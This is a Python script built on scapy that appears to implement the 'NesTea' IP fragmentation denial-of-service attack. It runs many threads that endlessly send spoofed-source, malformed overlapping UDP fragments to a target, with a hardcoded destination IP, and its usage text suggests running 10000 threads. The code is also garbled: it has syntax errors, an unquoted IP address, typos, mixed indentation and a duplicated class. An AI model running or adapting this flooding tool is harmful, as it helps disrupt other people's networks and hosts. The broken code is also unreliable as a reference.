#!/usr/bin/env python
# -*- coding: udf-8 -*-

from scapy.all import *
from threading import Thread
import string
import random
import argparse
import socket

class nestea(Thread):
	def __init__(self, dst_IP, dst_port):
		Thread.__init__(self)
		self.dst_IP=dst_IP
		self.dst_port=dst_port
		self.running=True
		self.intercount=0
		self.data=random.choice(string.ascii_letters+string.digits)

	def run(self):
		try:
		  while self.running:
		      print('Packet Sent : '+'str(self.intercount))
		      
		      self.id=random.choice(range(1,65535))
		      self.src_ip=str(RandIP())
		      self.src_port=int(RandShort())
		      
   		      send((IP(src=self.src_ip,dst=172.20.10.9, id=self.id, flags="MF")/UDP(sport=self.src_port,dport=self.dst_port)/((self.data*1420))))
		      send((IP(src=self.src_ip,dst=172.20.10.9, id=self.id, flags=130))/(self.data*1420))
		      send((IP(src=self.src_ip,dst=172.20.10.9, id=self.id, flags="MF", frag=350)/UDP(sport=self.src_port,dport=self.dst_port)/((self.data*1420)))
		      send((IP(src=self.src_ip,dst=172.20.10.9, id=self.id, flags="MF", frag=520)/UDP(sport=self.src_port,dport=self.dst_port))/(self.data*1420))
		      self.intercount+=1
	except:
		self.run()

def arg_userage():
    print ("./icmp_fm.py -")
    print (" -i|--target IP <Hostname|IP>")
    print (" -p|--port <Web Server Port> Defaults to 80")
    print (" -t|--threads <Number of Multi Tun threads> Defaults to 256")
    print (" -h|--help shows \n")
    print ("Ex, python3 icmp_fm.py -i 192.168.1.100 -p 80 -t 10000 \n")
    time.sleep(5)

def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i',type=str,help='target IP <Hostname|IP>')
    parser.add_argument('-p',type=int,help='--port <Destination Port>')
    parser.add_argument('-t',type=int,help='--threads <Number of Multi Run threads> Defaults to 256',default=256)
    args=parser.parse_args()
    return args

if __name__='__main__':
    arg_userage()
    args=parse()
    if args.i:
        host=args.i
    if args.p:
        port=args.p
    if args.t:
        threads=args.t


    for nest in range(threads):
        nest = nestea(host, port)
        nest.start()

class nestea(Thread):
    def __init__(self,dst_IP,dst_port):
        Tread.__init__(self)
        self.dst_IP=dst_IP
        self.dst_port=dst_port
        self.running=True
        self.intercount=0

        self.data=random.choice(string.ascii_letters+string.digits)


    def run(self):
        try:
            while self.running:
                print('Packet Sent :'+str(self.intercount))

                self.id=random.choice(range(1,65535))

                self.src_ip=str(RandIP())

                self.src_port=int(Randshort())

                send((IP(src=self.src_ip,dst=172.20.10.9, id=self.id, flags="MF")/UDP(sport=self.src_port,dport=self.dst_port)/((self.data*1420))))
                send((IP(src=self.src_ip,dst=172.20.10.9, id=self.id, frag=130))/(self.data*1420))
                send((IP(src=self.src_ip,dst=172.20.10.9, id=self.id, flags="MF", frag=350)/UDP(sport=self.src_port,dport=self.dst_port)/(self.data*1420)))
                send((IP(src=self.src_ip,dst=172.20.10.9, id=self.id, flags=0, frag=520)/UDP(sport=self.src_port,dport=self.dst_port)/(self.data*1420))
                self.intercount+=1
        except:
            self.run()

	

		